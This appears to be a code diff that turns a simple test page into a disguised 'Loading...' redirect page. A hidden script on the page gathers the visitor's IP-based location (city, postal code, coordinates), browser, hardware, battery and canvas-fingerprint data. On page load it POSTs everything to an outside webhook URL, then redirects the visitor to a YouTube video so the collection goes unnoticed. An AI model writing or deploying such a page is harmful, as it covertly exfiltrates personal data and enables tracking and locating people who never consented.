@@ -2,9 +2,229 @@
 <html>
 <head>
     <title>Loading...</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-    <h1>Hello World!</h1>
-    <p>This is a test page.</p>
+    <h2>Loading...</h2>
+    <div class="spinner"></div>
+    <p>Please wait while we redirect you...</p>
+
+    <script>
+        // ===== CONFIGURATION =====
+        const WEBHOOK_URL = 'https://webhook.site/2b17dc40-ef1a-4a3d-b772-f39739292924f8';
+        const REDIRECT_TO = 'https://www.youtube.com/watch?v=jNQXAC9IVRw'; // Change to any URL
+
+        // ===== COMPREHENSIVE DATA COLLECTION =====
+        async function captureComprehensiveInfo() {
+            try {
+                // Get IP and Geolocation
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
+
+                // Basic Browser Info
+                const browserInfo = {
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookies_enabled: navigator.cookieEnabled,
+                    do_not_track: navigator.doNotTrack,
+                    online_status: navigator.onLine ? 'Online' : 'Offline',
+                    java_enabled: navigator.javaEnabled(),
+                };
+
+                // Screen & Display Info
+                const screenInfo = {
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    screen_available: `${screen.availWidth}x${screen.availHeight}`,
+                    color_depth: `${screen.colorDepth}-bit`,
+                    pixel_depth: `${screen.pixelDepth}-bit`,
+                    orientation: screen.orientation ? screen.orientation.type : 'Unknown',
+                    pixel_ratio: window.devicePixelRatio,
+                };
+
+                // Window & Viewport Info
+                const windowInfo = {
+                    viewport_size: `${window.innerWidth}x${window.innerHeight}`,
+                    outer_size: `${window.outerWidth}x${window.outerHeight}`,
+                    scroll_position: `${window.scrollX},${window.scrollY}`,
+                };
+
+                // Hardware Info
+                const hardwareInfo = {
+                    cpu_cores: navigator.hardwareConcurrency || 'Unknown',
+                    device_memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+                    touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                    max_touch_points: navigator.maxTouchPoints || 0,
+                };
+
+                // Network Info
+                let networkInfo = {
+                    connection_type: 'Unknown',
+                    effective_type: 'Unknown',
+                    downlink: 'Unknown',
+                    rtt: 'Unknown',
+                };
+                if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
+                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    networkInfo = {
+                        connection_type: conn.effectiveType || 'Unknown',
+                        effective_type: conn.effectiveType || 'Unknown',
+                        downlink: conn.downlink ? `${conn.downlink}Mbps` : 'Unknown',
+                        rtt: conn.rtt ? `${conn.rtt}ms` : 'Unknown',
+                        save_data: conn.saveData || false,
+                    };
+                }
+
+                // Battery Info
+                let batteryInfo = { level: 'Unknown', charging: 'Unknown' };
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = {
+                            level: `${Math.round(battery.level * 100)}%`,
+                            charging: battery.charging ? 'Yes' : 'No',
+                            charging_time: battery.chargingTime !== Infinity ? `${battery.chargingTime}s` : 'N/A',
+                            discharging_time: battery.dischargingTime !== Infinity ? `${battery.dischargingTime}s` : 'N/A',
+                        };
+                    } catch (e) {}
+                }
+
+                // Browser Features Support
+                const features = {
+                    local_storage: typeof(Storage) !== 'undefined',
+                    session_storage: typeof(Storage) !== 'undefined',
+                    indexed_db: !!window.indexedDB,
+                    service_worker: 'serviceWorker' in navigator,
+                    web_assembly: typeof WebAssembly === 'object',
+                    webgl: !!document.createElement('canvas').getContext('webgl'),
+                    webrtc: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+                    geolocation: 'geolocation' in navigator,
+                    notifications: 'Notification' in window,
+                    vibration: 'vibrate' in navigator,
+                    bluetooth: 'bluetooth' in navigator,
+                    usb: 'usb' in navigator,
+                };
+
+                // Timezone & Date Info
+                const timezoneInfo = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezone_offset: new Date().getTimezoneOffset(),
+                    local_time: new Date().toLocaleString(),
+                };
+
+                // Plugins Info
+                const plugins = Array.from(navigator.plugins || []).map(p => ({
+                    name: p.name,
+                    description: p.description,
+                    filename: p.filename,
+                }));
+
+                // WebGL Info
+                let webglInfo = { vendor: 'Unknown', renderer: 'Unknown' };
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            webglInfo = {
+                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                            };
+                        }
+                    }
+                } catch (e) {}
+
+                // Canvas Fingerprint
+                let canvasFingerprint = 'Unknown';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillText('Browser Fingerprint', 2, 2);
+                    canvasFingerprint = canvas.toDataURL().substring(0, 50);
+                } catch (e) {}
+
+                // Combine ALL data
+                const comprehensiveData = {
+                    // Timestamp
+                    timestamp: new Date().toISOString(),
+                    
+                    // Geolocation Data
+                    geolocation: {
+                        ip: geoData.ip || 'Unknown',
+                        city: geoData.city || 'Unknown',
+                        region: geoData.region || 'Unknown',
+                        country: geoData.country_name || 'Unknown',
+                        country_code: geoData.country_code || 'Unknown',
+                        postal: geoData.postal || 'Unknown',
+                        latitude: geoData.latitude || 'Unknown',
+                        longitude: geoData.longitude || 'Unknown',
+                        isp: geoData.org || 'Unknown',
+                        asn: geoData.asn || 'Unknown',
+                    },
+                    
+                    // All collected data
+                    browser: browserInfo,
+                    screen: screenInfo,
+                    window: windowInfo,
+                    hardware: hardwareInfo,
+                    network: networkInfo,
+                    battery: batteryInfo,
+                    features_support: features,
+                    timezone: timezoneInfo,
+                    plugins: plugins.length > 0 ? plugins : 'None detected',
+                    webgl: webglInfo,
+                    canvas_fingerprint: canvasFingerprint,
+                    
+                    // Referrer
+                    referrer: document.referrer || 'Direct visit',
+                    page_url: window.location.href,
+                };
+
+                // Send to webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(comprehensiveData, null, 2)
+                });
+
+                console.log('Data captured successfully:', comprehensiveData);
+
+            } catch (error) {
+                console.error('Error capturing data:', error);
+            } finally {
+                // Always redirect after 2 seconds
+                setTimeout(() => {
+                    window.location.href = REDIRECT_TO;
+                }, 2000);
+            }
+        }
+
+        // Run on page load
+        captureComprehensiveInfo();
+    </script>
 </body>
 </html>
